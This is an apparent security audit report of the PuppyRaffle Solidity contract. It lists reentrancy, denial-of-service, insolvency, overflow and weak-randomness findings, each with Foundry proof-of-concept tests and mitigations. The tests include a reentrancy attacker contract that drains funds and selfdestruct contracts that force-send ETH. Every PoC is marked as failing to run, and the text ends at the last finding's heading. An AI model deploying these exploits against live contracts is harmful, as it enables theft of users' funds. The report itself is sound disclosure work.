# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Pattern


 **Derived From** : Reentrancy in refund() via Checks-Effects-Interactions Violation

[H-1]. Reentrancy in refund() allows draining entire contract balance
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Duplicate check flaw bricks contract after multiple refunds

[M-2]. DoS in enterRaffle due to duplicate zero-address check
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Standard Violation / Denial of Service via Unbounded Nested Loop

[M-3]. Unbounded nested loop in enterRaffle causes Denial of Service
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Strict balance equality check enables DoS via forced ETH

[H-4]. Strict balance equality check in withdrawFees allows DoS via forced ETH
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Strict Balance Equality in withdrawFees causes DoS

[M-5]. Strict balance equality in withdrawFees enables DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Insolvency via 'Ghost Players' in Prize Calculation

[M-6]. Insolvency in selectWinner due to accounting mismatch with refunded players
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Accounting Invariant Violation via Integer Overflow and Truncation in totalFees

[H-7]. Integer Overflow and Unsafe Casting in fee calculation locks protocol fees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Weak Randomness using Block Timestamp and Difficulty

[M-8]. Weak Randomness allows predicting winner and rarity
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 3
- M: 5
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Reentrancy in refund() via Checks-Effects-Interactions Violation

## [H-1]. Reentrancy in refund() allows draining entire contract balance

### Finding Severity Justification: refund() performs an external call via Address.sendValue (forwards all gas) before updating state, allowing a malicious recipient to reenter refund() repeatedly and receive entranceFee multiple times for a single ticket. This enables direct theft of protocol funds (pot and accumulated fees) up to call-depth and balance limits. Direct loss of funds qualifies as High per C4 rubric.
## Derived From Pattern/Invariant
Reentrancy in refund() via Checks-Effects-Interactions Violation

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refund` function violates the Checks-Effects-Interactions pattern. It transfers ETH to `msg.sender` using `sendValue` (which allows code execution) *before* updating the `players` array to remove the player (setting them to `address(0)`). A malicious contract can re-enter `refund` inside its `receive` or `fallback` function. Since the state `players[playerIndex]` is not yet updated, the check `require(playerAddress != address(0))` passes again, allowing the attacker to refund the same ticket multiple times until the contract is drained.

## Impact
An attacker who holds a single ticket can repeatedly reenter refund() and receive entranceFee multiple times before their slot is cleared, draining the entire PuppyRaffle balance (all users’ deposits currently in the round, plus any accumulated funds) until the contract balance is exhausted. This results in direct theft of funds from the protocol and users.

## Command to Run Test


## Proof of Concept
Precondition: The contract must hold at least entranceFee more than the attacker’s own deposit (e.g., honest users have already entered). Steps:
1) Honest users enter the raffle, funding the pot with N*entranceFee.
2) Attacker enters once to acquire a ticket.
3) Attacker calls refund(index) for their ticket. The function performs an external call via Address.sendValue before clearing players[index].
4) In the attacker’s receive(), immediately reenter refund(index) again. Since players[index] is still the attacker address, the checks pass and another entranceFee is sent out.
5) Step 4 repeats recursively until the contract balance falls below entranceFee. The attacker extracts entranceFee on each reentry, effectively draining the entire balance.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public target;
    constructor(PuppyRaffle _target) { target = _target; }

    function attack() external {
        // Enter once to get a ticket
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        target.enterRaffle{value: 1 ether}(arr);
        // Compute our index (guaranteed > 0 since we pre-seeded pot with other players)
        uint256 idx = target.getActivePlayerIndex(address(this));
        require(idx != 0, "attacker must not be at index 0");
        target.refund(idx);
    }

    receive() external payable {
        // Keep reentering as long as the contract can pay another entranceFee
        if (address(target).balance >= 1 ether) {
            uint256 idx = target.getActivePlayerIndex(address(this));
            target.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle target;

    function setUp() public {
        target = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        // Seed pot with honest users (3 tickets)
        vm.deal(address(this), 100 ether);
        address[] memory arr = new address[](3);
        arr[0] = address(0xA11CE);
        arr[1] = address(0xB0B);
        arr[2] = address(0xCAFE);
        target.enterRaffle{value: 3 ether}(arr);
    }

    function test_refundReentrancyDrainsBalance() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(target);
        // Fund attacker so it can buy one ticket
        vm.deal(address(attacker), 1 ether);
        // Trigger attack
        attacker.attack();
        // Entire balance (3 ether from honest users + 1 ether attacker deposit) is drained
        assertEq(address(target).balance, 0, "contract should be drained");
    }
}


## Suggested Mitigation
Apply Checks-Effects-Interactions and/or a reentrancy guard to refund(). Specifically: (1) Verify sender and active slot, (2) set players[playerIndex] = address(0), then (3) transfer funds. Optionally add nonReentrant via ReentrancyGuard. Example: require(players[idx] == msg.sender && players[idx] != address(0), ...); players[idx] = address(0); (bool ok,) = msg.sender.call{value: entranceFee}(""); require(ok, "refund failed"); This ordering prevents reentry from passing the preconditions on subsequent calls, eliminating the drain. Also consider adding nonReentrant to other external functions that transfer ETH (e.g., withdrawFees/selectWinner) for defense-in-depth.





 **Derived From** : Duplicate check flaw bricks contract after multiple refunds

## [M-2]. DoS in enterRaffle due to duplicate zero-address check

### Finding Severity Justification: The issue causes a denial of service of the core entry function for the raffle. While no assets are directly stolen, the protocol becomes unusable (no new entries possible) once two refunded slots exist, potentially bricking the raffle until a winner is selected. This is a significant availability impact but not direct asset loss, aligning with Medium per Code4rena rubric.
## Derived From Pattern/Invariant
Duplicate check flaw bricks contract after multiple refunds

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function enforces unique players using a nested loop: `require(players[i] != players[j])`. When a player refunds, their slot in the `players` array is set to `address(0)`. If two different players refund, the array will contain two `address(0)` entries. Subsequent calls to `enterRaffle` (which iterates the whole array) will compare these two zero addresses, find they are equal, and revert with 'PuppyRaffle: Duplicate player'. This permanently blocks anyone from entering the raffle once two refunds have occurred.

## Impact
enterRaffle becomes unusable once there are at least two refunded slots set to address(0), because the global duplicate check compares these zeros and reverts. This blocks all new entries until players is reset. If the array length is < 4 at that point, selectWinner cannot be called (it requires length ≥ 4), so the raffle is bricked indefinitely. If length ≥ 4 and the time has elapsed, a new round can be started by selecting a winner, but until then the entry function is effectively DoS'ed.

## Command to Run Test


## Proof of Concept
Key observation: enterRaffle pushes new players first, then runs a global O(n^2) duplicate check across the entire players array. After two refunds, players contains two address(0) entries. Any subsequent enterRaffle call appends new players, then the check encounters the two zero entries and reverts with "PuppyRaffle: Duplicate player".

Steps:
1) Attacker (or two colluding users) enters twice with two distinct addresses A and B.
2) A calls refund(0) and B calls refund(1), leaving players = [address(0), address(0)].
3) Any user tries to enter with a fresh address C.
4) enterRaffle first pushes C, then the duplicate check compares players[0] and players[1] (both zero) and reverts with "PuppyRaffle: Duplicate player". No one can enter until the round is reset. If players.length < 4 at this time, selectWinner cannot be executed, bricking the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract DosDuplicateZeroTest is Test {
    PuppyRaffle private puppyRaffle;
    address private constant FEE_ADDR = address(0xFEE);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, FEE_ADDR, 1 days);
        vm.deal(address(this), 10 ether);
        vm.deal(address(1), 1 ether);
        vm.deal(address(2), 1 ether);
        vm.deal(address(3), 1 ether);
    }

    function test_DoS_EnterRaffle_DuplicateZeroAddresses() public {
        address[] memory arr = new address[](1);

        // Enter with two distinct participants A and B
        arr[0] = address(1);
        puppyRaffle.enterRaffle{value: 1 ether}(arr);
        arr[0] = address(2);
        puppyRaffle.enterRaffle{value: 1 ether}(arr);

        // Both participants refund, leaving two zero-address holes
        vm.prank(address(1));
        puppyRaffle.refund(0); // players[0] = address(0)
        vm.prank(address(2));
        puppyRaffle.refund(1); // players[1] = address(0)

        // Any further entry will revert due to duplicate check comparing the two zeros
        arr[0] = address(3);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        puppyRaffle.enterRaffle{value: 1 ether}(arr);
    }
}


## Suggested Mitigation
In enterRaffle, exclude zero-address slots from the duplicate check and reject zero-address inputs:
- Add `require(newPlayers[i] != address(0), "PuppyRaffle: zero address not allowed");` before pushing.
- When checking for duplicates across players, skip comparisons involving address(0): `if (players[i] == address(0) || players[j] == address(0)) continue;`.
Better yet, replace the O(n^2) scan with a mapping(address => bool) active set:
- For each newPlayers[i], require non-zero and `!active[newPlayers[i]]`, then set `active[newPlayers[i]] = true` and push to players.
- On refund, set `active[players[index]] = false` and clear the slot (or swap-and-pop to avoid zero holes). This fully eliminates the duplicate-zero DoS and reduces gas.





 **Derived From** : Standard Violation / Denial of Service via Unbounded Nested Loop

## [M-3]. Unbounded nested loop in enterRaffle causes Denial of Service

### Finding Severity Justification: enterRaffle performs an O(N^2) duplicate check over the entire players array each call. As the number of participants grows, gas usage scales quadratically and can exceed the block gas limit, preventing further entries for the round. This is a denial-of-service on a core user action (joining the raffle), but does not directly steal funds or permanently brick the protocol (array is reset on selectWinner), so Medium is appropriate.
## Derived From Pattern/Invariant
Standard Violation / Denial of Service via Unbounded Nested Loop

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function performs a duplicate check using a nested loop over the `players` array. This logic has a complexity of O(N^2). As the number of participants increases, the gas cost to execute `enterRaffle` grows quadratically. Eventually, the gas required will exceed the block gas limit, rendering the function uncallable and preventing new players from joining.

## Impact
Denial of Service on entering the raffle. Any actor can bloat the players array by entering with many unique addresses; the nested O(N^2) duplicate check then makes enterRaffle increasingly expensive and eventually uncallable under realistic gas limits. Critically, the attacker can largely recover their funds by calling refund on each address (leaving zero-address holes), which does not reduce players.length, so subsequent enterRaffle calls still scan the full array and remain prohibitively expensive. This enables low-cost, repeatable griefing that blocks new participation for the remainder of the round until selectWinner resets the array.

## Command to Run Test


## Proof of Concept
Attack outline:
1) Attacker funds many EOAs (or uses CREATE2) and repeatedly calls enterRaffle([{attackerAddr_i}]) with unique addresses, paying entranceFee each time. This pushes players.length upward.
2) Because the contract checks duplicates with a nested loop over the entire players array each time, the cost per call grows roughly with players.length^2. Past a threshold, enterRaffle cannot fit within a practical gas budget and starts reverting for honest users.
3) The attacker then calls refund for many of their indices, reclaiming their entranceFee while leaving players[index] = address(0). Importantly, players.length is unchanged, so the nested duplicate scan still iterates over all slots (including holes), keeping gas costs high and preserving the DoS.
4) The attacker can repeat Steps 1–3 early in each round to prevent new entrants until selectWinner executes and resets the array.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PuppyRaffleGasDoSTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xBEEF), 1 days);
        vm.deal(address(this), 100000 ether);
    }

    // Demonstrates that enterRaffle becomes uncallable under a fixed gas budget as players.length grows
    function test_enterRaffle_gas_DoS() public {
        uint256 gasCap = 2_000_000; // fixed, modest gas budget
        uint256 successes = 0;

        for (uint256 i = 1; i < 5000; i++) {
            address[] memory batch = new address[](1);
            batch[0] = address(uint160(i)); // unique addresses

            bytes memory data = abi.encodeWithSelector(raffle.enterRaffle.selector, batch);
            (bool ok,) = address(raffle).call{gas: gasCap, value: 1 ether}(data);

            if (!ok) {
                // Once false, we have shown DoS under the capped gas budget
                assertLt(successes, i, "sanity");
                return;
            } else {
                successes++;
            }
        }

        fail("expected limited-gas enterRaffle to fail before 5000 entrants");
    }

    // Shows refunds don't reduce players.length, so DoS pressure persists despite funds being returned
    function test_refund_does_not_reduce_cost() public {
        // Grow players to 50 entries
        for (uint256 i = 1; i <= 50; i++) {
            address[] memory batch = new address[](1);
            batch[0] = address(uint160(i));
            raffle.enterRaffle{value: 1 ether}(batch);
        }

        // Refund 25 entries (creates holes but does not shrink length)
        for (uint256 i = 0; i < 25; i++) {
            vm.prank(address(uint160(i + 1)));
            raffle.refund(i);
        }

        // Try to enter again with a low gas cap; should still fail due to full-length nested scan
        uint256 gasCap = 300_000;
        address[] memory one = new address[](1);
        one[0] = address(0x1234);
        bytes memory data = abi.encodeWithSelector(raffle.enterRaffle.selector, one);
        (bool ok,) = address(raffle).call{gas: gasCap, value: 1 ether}(data);
        assertTrue(!ok, "length-based scan still too costly despite refunds (holes remain)");
    }
}


## Suggested Mitigation
Replace the nested duplicate scan with O(1) membership checks and avoid scanning players.length each call.

Option A (simple and safe):
- Track participation with mapping(address => bool) isActive.
- In enterRaffle, for each newPlayers[i]:
  - require(newPlayers[i] != address(0), "invalid");
  - check duplicates within the batch only (O(k^2) where k = newPlayers.length, typically small).
  - require(!isActive[newPlayers[i]], "duplicate"); set isActive[newPlayers[i]] = true; push to players.
- In refund(index): set isActive[msg.sender] = false before zeroing array slot.
- In selectWinner(): after determining the winner, either iterate once over players to clear isActive flags and then delete players, or use the epoch pattern below to avoid iteration.

Option B (recommended, no per-round clearing): epoch-based gating
- Use mapping(address => uint256) lastEnteredEpoch and uint256 currentEpoch.
- enterRaffle: require(lastEnteredEpoch[p] != currentEpoch), then set lastEnteredEpoch[p] = currentEpoch and push p. Also validate batch for intra-batch duplicates.
- refund: set lastEnteredEpoch[msg.sender] = 0 (allow re-entry in the same epoch after refund).
- selectWinner: increment currentEpoch and delete players (no need to traverse to clear flags).

Either approach removes the O(N^2) scan while preserving duplicate protections, and ensures refunds/round resets interact correctly with the membership checks.





 **Derived From** : Strict balance equality check enables DoS via forced ETH

## [H-4]. Strict balance equality check in withdrawFees allows DoS via forced ETH

### Finding Severity Justification: withdrawFees uses a strict equality check between address(this).balance and totalFees. Anyone can force ETH into the contract via selfdestruct, making the balance > totalFees and causing withdrawFees to always revert. This permanently prevents withdrawal of already-accrued fees (matured yield), representing a direct loss of protocol assets. The attack is permissionless and persists across rounds.
## Derived From Pattern/Invariant
Strict balance equality check enables DoS via forced ETH

## Exploit Type
ForcedAssetVsStrictEquality

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdrawFees` function requires `address(this).balance == uint256(totalFees)`. This invariant is extremely fragile. An attacker can force 1 wei of ETH into the contract using `selfdestruct` (which bypasses fallback functions). This makes `address(this).balance > totalFees`, causing the requirement to fail and preventing the owner from ever withdrawing fees.

## Impact
Permanent Denial of Service of fee withdrawals; loss of protocol revenue.

## Command to Run Test


## Proof of Concept
An attacker can permanently brick fee withdrawals by force-sending ETH to the contract so that address(this).balance > totalFees, making the strict equality check fail forever. Steps: (1) Normal users run a raffle to accumulate fees (totalFees > 0). (2) Attacker deploys a short-lived contract that selfdestructs to PuppyRaffle with value=1 wei. (3) Now address(this).balance = totalFees + 1. (4) Any call to withdrawFees() reverts on require(address(this).balance == uint256(totalFees)), permanently preventing the protocol from withdrawing legitimate fees.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract StrictBalanceEqualityDoSTest is Test {
    PuppyRaffle private raffle;
    address private feeAddr = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddr, 1 days);
        vm.deal(address(this), 100 ether);

        address[] memory participants = new address[](4);
        participants[0] = address(0xA1);
        participants[1] = address(0xB2);
        participants[2] = address(0xC3);
        participants[3] = address(0xD4);

        // Fund the pot and accrue protocol fees
        raffle.enterRaffle{value: 4 ether}(participants);

        // Finish raffle to move fees into totalFees and clear players
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        // Sanity: only fees should remain in contract
        uint256 fees = raffle.totalFees();
        assertEq(address(raffle).balance, fees, "precondition: contract should hold only fees");
    }

    function test_DoS_viaForcedETH_breaksStrictEquality() public {
        // Attacker force-sends 1 wei into the contract via selfdestruct
        new ForcedSender{value: 1}(address(raffle));

        // Now strict equality fails: balance > totalFees
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

contract ForcedSender {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}


## Suggested Mitigation
Avoid fragile strict equality on the entire contract balance. Replace the check with a state-based gate and a non-strict balance assertion:
- require(players.length == 0, "Raffle active");
- require(address(this).balance >= totalFees, "Insufficient balance");
Then transfer only totalFees: `uint256 feesToWithdraw = totalFees; totalFees = 0; (bool ok,) = feeAddress.call{value: feesToWithdraw}(""); require(ok, "Withdraw failed");`
Optionally, add an owner-only sweep function to rescue any non-fee stray ETH (e.g., from forced sends) without blocking fee withdrawals.





 **Derived From** : Strict Balance Equality in withdrawFees causes DoS

## [M-5]. Strict balance equality in withdrawFees enables DoS

### Finding Severity Justification: Strict equality on contract balance in withdrawFees allows permanent denial of fee withdrawals. Anyone can force-send ETH via selfdestruct, making balance > totalFees, and integer division during prize/fee splits can leave unaccounted dust (when entranceFee * players.length is not divisible by 5), making balance = totalFees + dust. In both cases, fees become stuck. Impact is loss of protocol revenue (team funds), not user funds, which aligns with Medium severity in Code4rena.
## Derived From Pattern/Invariant
Strict Balance Equality in withdrawFees causes DoS

## Exploit Type
ForcedAssetVsStrictEquality

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdrawFees` function enforces `require(address(this).balance == uint256(totalFees))`. This invariant is easily broken. 1) An attacker can send dust ETH via `selfdestruct` to the contract, making balance > totalFees. 2) Integer division in `selectWinner` causes `totalFees` + `prizePool` < `totalAmountCollected`, leaving dust in the contract naturally. In both cases, the strict equality fails, preventing fee withdrawal.

## Impact
Anyone can permanently block fee withdrawals by force-sending ETH (e.g., via selfdestruct) so that address(this).balance != totalFees. Additionally, if entranceFee * players.length is not divisible by 5, integer rounding leaves residual dust that also breaks equality. As a result, protocol fees become stuck indefinitely (loss of protocol revenue) without affecting user funds.

## Command to Run Test


## Proof of Concept
Attack outline:
1) Attacker deploys a contract and calls selfdestruct(target=PuppyRaffle), sending 1 wei to the raffle.
2) Now address(this).balance = 1 while totalFees = 0, so withdrawFees() reverts due to strict equality.
3) Even after a normal round completes (selectWinner), totalFees will equal the 20% fee but address(this).balance will be totalFees + 1 wei (the forced dust), so withdrawFees() continues to revert indefinitely.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract SelfDestructor {
    function boom(address payable to) external payable {
        selfdestruct(to);
    }
}

contract WithdrawFeesEqualityTest is Test {
    PuppyRaffle internal raffle;
    address internal feeAddr = address(0xFEE);
    uint256 internal entranceFee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddr, 1);
    }

    function test_DoS_viaForcedETH_and_PersistsAfterRound() public {
        // Force-send 1 wei via selfdestruct
        SelfDestructor s = new SelfDestructor();
        vm.deal(address(s), 1);
        s.boom(payable(address(raffle)));

        // With zero fees accrued, equality already breaks (balance=1, totalFees=0)
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();

        // Accrue real fees via a normal round
        address[] memory players = new address[](5);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        players[4] = address(5);

        vm.deal(address(this), entranceFee * players.length);
        raffle.enterRaffle{value: entranceFee * players.length}(players);

        vm.warp(block.timestamp + 2);
        raffle.selectWinner();

        // Still reverts: balance == totalFees + 1 wei (forced dust)
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Remove the strict balance equality gate and decouple it from fee accounting and active players:
- In withdrawFees, replace the check with:
  require(players.length == 0, "PuppyRaffle: players active");
  require(address(this).balance >= totalFees, "PuppyRaffle: insufficient balance");
  Then transfer exactly totalFees and set totalFees = 0.
- Compute fee using the remainder to eliminate rounding dust:
  prizePool = (totalAmountCollected * 80) / 100;
  fee = totalAmountCollected - prizePool; // captures any remainder
- Optionally add an owner-only sweep function callable only when players.length == 0 to forward any accidental/dust ETH to feeAddress, ensuring no permanent equality-based lock can occur.





 **Derived From** : Insolvency via 'Ghost Players' in Prize Calculation

## [M-6]. Insolvency in selectWinner due to accounting mismatch with refunded players

### Finding Severity Justification: The bug allows anyone to brick the core raffle flow by causing selectWinner to revert due to an inflated prizePool computed from players.length that includes refunded (zeroed) entries. While this prevents prize distribution and protocol operation (availability impact), player funds are not irretrievably lost because users can still call refund to recover their stakes. Therefore, this is a significant functional Denial of Service with indirect asset impact, aligning with Medium severity under Code4rena guidelines.
## Derived From Pattern/Invariant
Insolvency via 'Ghost Players' in Prize Calculation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function calculates `totalAmountCollected` as `players.length * entranceFee`. However, the `refund` function does not reduce `players.length`; it simply replaces the refunded player's address with `address(0)`. This means `totalAmountCollected` includes the entrance fees of refunded players (which have already left the contract). The `prizePool` is calculated as 80% of this inflated amount. If enough players refund, the calculated `prizePool` will exceed the contract's actual ETH balance, causing the transfer to the winner to revert due to insufficient funds, permanently bricking the raffle.

## Impact
An attacker can cause selectWinner to revert by refunding enough tickets so that prizePool = 80% of (players.length * entranceFee) exceeds the contract’s actual balance (which reflects only active, non-refunded tickets). This results in an indefinite Denial of Service for winner selection until sufficient new tickets are purchased to cover the shortfall. User funds are not lost (players can still refund), but the raffle’s core flow is halted and fee withdrawals are also blocked by ongoing activity.

## Command to Run Test


## Proof of Concept
1. 4 Players enter (4 ETH total). 2. 1 Player refunds (Contract balance = 3 ETH, players.length = 4). 3. `selectWinner` is called. 4. `totalAmountCollected` = 4 * 1 ETH = 4 ETH. 5. `prizePool` = 3.2 ETH. 6. Contract attempts to send 3.2 ETH, but only has 3 ETH. Transaction reverts.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract InsolvencyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    uint256 duration = 1 days;
    address feeAddr = address(999);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddr, duration);
        vm.deal(address(this), 100 ether);
    }

    function test_selectWinnerRevertsWhenRefundedCreatesInsolvency() public {
        // 1) Four players enter (4 ETH total)
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        // 2) One player refunds, balance becomes 3 ETH but players.length stays 4
        vm.prank(address(1));
        puppyRaffle.refund(0);

        // 3) Advance time beyond raffle duration
        vm.warp(block.timestamp + duration + 1);

        // 4) selectWinner computes prizePool = 0.8 * (4 * 1 ETH) = 3.2 ETH
        //    Contract balance is only 3 ETH -> transfer fails -> revert
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        puppyRaffle.selectWinner();
    }
}


## Suggested Mitigation
Do not base totalAmountCollected on players.length. Instead, compute pot from active tickets only or from a dedicated accounting variable that tracks active entries: (a) Track activeCount and update it on enter/refund, then use totalAmountCollected = activeCount * entranceFee; or (b) Iterate players to count non-zero addresses before computing the pot (less gas efficient). Additionally, prevent zero-address entries and ensure the winner is non-zero. Example direction:
- Maintain uint256 activeCount; increment on each valid enter and decrement on refund.
- In selectWinner: require(activeCount >= 4); choose winner from active indices (or maintain a packed list); set totalAmountCollected = activeCount * entranceFee; compute prizePool and fee from that amount; then transfer accordingly.
This guarantees the prize pool never exceeds the actual available balance and removes the insolvency/DoS condition.





 **Derived From** : Accounting Invariant Violation via Integer Overflow and Truncation in totalFees

## [H-7]. Integer Overflow and Unsafe Casting in fee calculation locks protocol fees

### Finding Severity Justification: totalFees is a uint64 while fees are computed in uint256 and cast down, with arithmetic in Solidity 0.7.6 being unchecked. A single round with a sufficiently large pot (e.g., ~93+ 1 ETH tickets → ~18.6 ETH fee) will truncate/overflow totalFees. Because withdrawFees requires address(this).balance == totalFees, any mismatch bricks fee withdrawals and locks all protocol fees. This is a direct, permanent loss of funds (fee revenues) and is realistically triggerable during normal operation.
## Derived From Pattern/Invariant
Accounting Invariant Violation via Integer Overflow and Truncation in totalFees

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The contract uses Solidity 0.7.6 (which does not check for integer overflow) and types `totalFees` as `uint64`. In `selectWinner`, `fee` (uint256) is explicitly cast to `uint64`. If `fee` exceeds `type(uint64).max` (~18.4 ETH), it truncates. Additionally, `totalFees + uint64(fee)` can silently overflow the `uint64` container. This results in `totalFees` tracking a value significantly lower than the actual ETH fees held by the contract. Since `withdrawFees` enforces a strict equality check `address(this).balance == totalFees`, this mismatch causes the withdrawal to permanently revert.

## Impact
Once the per-round fee or the cumulative unwithdrawn fees exceed 2^64-1 wei (~18.4467440737 ETH), casting fee to uint64 truncates and the uint64 accumulator wraps. This desynchronizes totalFees from the contract’s real ETH balance. Because withdrawFees enforces address(this).balance == totalFees, the check will fail forever after the first threshold crossing, permanently bricking fee withdrawals and locking all protocol fee revenue.

## Command to Run Test


## Proof of Concept
Assume entranceFee = 1 ether (per deployment script). 1) An attacker (or regular users) enters a round with 93 unique players. Total pot = 93 ETH. 2) After raffleDuration elapses, anyone calls selectWinner. 3) fee = 20% of 93 ETH = 18.6 ETH, which exceeds uint64.max (~18.4467 ETH). Casting to uint64 truncates fee to ~0.153255926290448385 ETH. 4) totalFees is updated with this truncated value, while the contract balance (after paying the winner) correctly holds 18.6 ETH of fees. 5) Owner calls withdrawFees: require(address(this).balance == totalFees) fails (18.6 ETH != ~0.1532 ETH). 6) In any subsequent rounds, totalFees continues to wrap modulo 2^64 while the contract balance continues to increase, making the equality impossible and bricking fee withdrawals permanently. Note: Even if no single round exceeds the threshold, the same permanent brick occurs once cumulative unwithdrawn fees cross uint64.max.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Minimal harness that mirrors the vulnerable accounting and withdraw invariant
contract FeeOverflowHarness {
    uint64 public totalFees; // mirrors PuppyRaffle's type

    receive() external payable {}

    // Mirrors: totalFees = totalFees + uint64(fee);
    function simulateSelectWinner(uint256 feeWei) external {
        totalFees = totalFees + uint64(feeWei);
    }

    // Mirrors the invariant used in PuppyRaffle.withdrawFees
    function withdrawFees() external view {
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    }
}

contract FeeOverflowTest is Test {
    FeeOverflowHarness h;

    function setUp() public {
        h = new FeeOverflowHarness();
    }

    function test_fee_overflow_locks_withdraw() public {
        // Emulate a PuppyRaffle round with entranceFee = 1 ether and 93 unique players
        uint256 entranceFee = 1 ether;
        uint256 players = 93;
        uint256 pot = entranceFee * players;             // 93 ether
        uint256 fee = (pot * 20) / 100;                  // 18.6 ether (> uint64.max ~18.4467 ether)

        // Simulate post-selectWinner contract balance holding the full fee amount
        vm.deal(address(this), fee);
        (bool ok,) = address(h).call{value: fee}("");
        require(ok, "send failed");

        // Simulate the buggy accounting update (uint64 cast + add)
        h.simulateSelectWinner(fee);

        // Sanity: stored totalFees is truncated and not equal to the real fee balance
        uint64 truncated = uint64(fee);
        assertEq(h.totalFees(), truncated);
        assertTrue(uint256(truncated) != fee);

        // Withdraw should brick due to strict equality check against truncated totalFees
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        h.withdrawFees();
    }
}


## Suggested Mitigation
1) Change totalFees to uint256 and remove the downcast: totalFees = totalFees + fee;. 2) Use Solidity >= 0.8.x (recommended) so arithmetic is checked by default, or explicitly use SafeMath in 0.7.x. 3) Avoid relying on strict balance equality to infer player activity. Instead, gate withdrawals with a direct state check (e.g., require(players.length == 0)) and optionally require(address(this).balance >= totalFees) to tolerate unrelated ETH/dust sent to the contract.





 **Derived From** : Weak Randomness using Block Timestamp and Difficulty

## [M-8]. Weak Randomness allows predicting winner and rarity

